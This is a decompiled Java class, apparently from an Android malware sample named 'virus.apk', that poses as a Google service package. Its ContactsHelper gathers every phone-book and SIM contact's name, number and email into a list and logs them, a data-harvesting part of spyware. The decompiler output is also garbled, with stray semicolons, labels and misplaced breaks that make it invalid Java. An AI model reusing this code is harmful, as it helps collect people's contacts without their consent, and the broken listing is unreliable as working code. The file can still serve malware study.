package com.example.google.service;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.text.TextUtils;
import java.io.PrintStream;
import java.util.ArrayList;

public class ContactsHelper
{

  @SuppressLint({"InlinedApi"})
  private static final String[] PHONES_PROJECTION = { "display_name", "data1", "photo_id", "contact_id" };
  private ArrayList<String> mContacts;
  private Context mContext;

  public ContactsHelper(Context paramContext)
  {
    this.mContext = paramContext;
  }

  private void getPhoneContactNumbers()
  {
    Cursor localCursor = this.mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
    if (localCursor != null);
    while (true)
    {
      if (!localCursor.moveToNext())
      {
        localCursor.close();
        return;
      }
      localCursor.getString(localCursor.getColumnIndex("contact_id"));
      String str = localCursor.getString(localCursor.getColumnIndex("data1"));
      if ((!TextUtils.isEmpty(str)) && (!this.mContacts.contains(str)))
        this.mContacts.add(str);
    }
  }

  private void getPhoneContacts()
  {
    ContentResolver localContentResolver = this.mContext.getContentResolver();
    Cursor localCursor1 = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
    if (localCursor1 != null);
    while (true)
    {
      if (!localCursor1.moveToNext())
      {
        localCursor1.close();
        return;
      }
      String str1 = localCursor1.getString(localCursor1.getColumnIndex("contact_id"));
      String str2 = localCursor1.getString(localCursor1.getColumnIndex("data1"));
      String str3 = localCursor1.getString(localCursor1.getColumnIndex("display_name"));
      if (TextUtils.isEmpty(str2))
        continue;
      Object localObject1 = str3 + ":" + str2;
      Object localObject2 = "";
      try
      {
        Cursor localCursor2 = localContentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "contact_id=" + str1, null, null);
        while (true)
        {
          if (!localCursor2.moveToNext())
          {
            localCursor2.close();
            String str6 = localObject1 + ":" + (String)localObject2;
            localObject1 = str6;
            label204: this.mContacts.add(localObject1);
            break;
          }
          String str4 = localCursor2.getString(localCursor2.getColumnIndex("data1"));
          System.out.println("id=" + str1 + " name=" + str3 + " email=" + str4);
          String str5 = localObject2 + str4 + ";";
          localObject2 = str5;
        }
      }
      catch (Exception localException)
      {
        break label204;
      }
    }
  }

  private void getSIMContactNumbers()
  {
    Cursor localCursor = this.mContext.getContentResolver().query(Uri.parse("content://icc/adn"), PHONES_PROJECTION, null, null, null);
    if (localCursor != null);
    while (true)
    {
      if (!localCursor.moveToNext())
      {
        localCursor.close();
        return;
      }
      String str = localCursor.getString(localCursor.getColumnIndex("data1"));
      if ((!TextUtils.isEmpty(str)) && (!this.mContacts.contains(str)))
        this.mContacts.add(str);
    }
  }

  private void getSIMContacts()
  {
    Cursor localCursor = this.mContext.getContentResolver().query(Uri.parse("content://icc/adn"), PHONES_PROJECTION, null, null, null);
    if (localCursor != null);
    while (true)
    {
      if (!localCursor.moveToNext())
      {
        localCursor.close();
        return;
      }
      String str1 = localCursor.getString(localCursor.getColumnIndex("data1"));
      String str2 = localCursor.getString(localCursor.getColumnIndex("display_name"));
      if ((!TextUtils.isEmpty(str1)) && (!this.mContacts.contains(str2 + ":" + str1)))
        this.mContacts.add(str2 + ":" + str1);
    }
  }

  public ArrayList<String> GetAllContactNumbers()
  {
    this.mContacts = new ArrayList();
    try
    {
      getPhoneContactNumbers();
      getSIMContactNumbers();
      label19: return this.mContacts;
    }
    catch (Exception localException)
    {
      break label19;
    }
  }

  public ArrayList<String> GetAllContacts()
  {
    this.mContacts = new ArrayList();
    try
    {
      getPhoneContacts();
      getSIMContacts();
      label19: return this.mContacts;
    }
    catch (Exception localException)
    {
      break label19;
    }
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.ContactsHelper
 * JD-Core Version:    0.6.2
 */